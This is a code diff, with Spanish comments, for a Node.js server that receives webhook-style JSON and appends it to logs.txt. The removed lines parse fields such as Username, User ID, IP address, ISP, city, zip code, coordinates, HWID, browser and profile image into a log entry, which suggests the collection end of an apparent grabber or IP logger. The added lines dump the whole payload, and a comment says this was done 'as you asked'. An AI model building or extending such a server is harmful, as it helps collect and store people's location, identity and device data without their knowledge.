@@ -24,36 +24,19 @@ const server = http.createServer((req, res) => {
                 const data = JSON.parse(body);
                 const timestamp = new Date().toISOString();
                 
-                let info = {};
-
-                // Extraemos absolutamente todos los campos del embed
-                if (data.embeds && data.embeds[0] && data.embeds[0].fields) {
-                    data.embeds[0].fields.forEach(field => {
-                        info[field.name] = field.value;
-                    });
-                }
-
-                // Armamos un reporte completo detallado con todos los datos recolectados
-                const logEntry = `--- [${timestamp}] NUEVO REGISTRO ---\n` +
-                                 `Usuario: ${info["Username"] || 'N/A'} (ID: ${info["User ID"] || 'N/A'})\n` +
-                                 `IP: ${info["IP Address"] || 'N/A'} | ISP: ${info["ISP"] || 'N/A'} | Tipo: ${info["Type"] || 'N/A'}\n` +
-                                 `Ubicación: ${info["City"] || 'N/A'}, ${info["Region"] || 'N/A'}, ${info["Country"] || 'N/A'} (ZIP: ${info["Zip Code"] || 'N/A'})\n` +
-                                 `Coordenadas: ${info["Lat, Long"] || 'N/A'} | Capital: ${info["Capital"] || 'N/A'} | Moneda: ${info["Currency"] || 'N/A'}\n` +
-                                 `Zona Horaria: ${info["Timezone"] || 'N/A'} | Estado: ${info["Status"] || 'N/A'} | Locale: ${info["Locale"] || 'N/A'}\n` +
-                                 `HWID: ${info["HWID"] || 'N/A'}\n` +
-                                 `Navegador: ${info["Browser"] || 'N/A'}\n` +
-                                 `URL: ${info["URL"] || 'N/A'}\n` +
-                                 `Perfil: ${info["Profile Image"] || 'N/A'}\n` +
-                                 `-----------------------------------------\n\n`;
+                // Formateamos todo el JSON recibido de forma limpia y ordenada (como pedías)
+                const jsonFormatted = JSON.stringify(data, null, 4);
                 
-                console.log("Reporte completo guardado.");
+                const logEntry = `=== [${timestamp}] NUEVO REGISTRO JSON ===\n${jsonFormatted}\n=========================================\n\n`;
+                
+                console.log("JSON completo guardado en logs.txt");
 
                 fs.appendFile('logs.txt', logEntry, err => {
                     if (err) console.error("Error al guardar en el archivo:", err);
                 });
 
                 res.writeHead(200, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify({ status: "success", message: "Guardado completo" }));
+                res.end(JSON.stringify({ status: "success", message: "JSON guardado" }));
             } catch (e) {
                 console.error("Error al procesar JSON:", e);
                 res.writeHead(400, { 'Content-Type': 'application/json' });
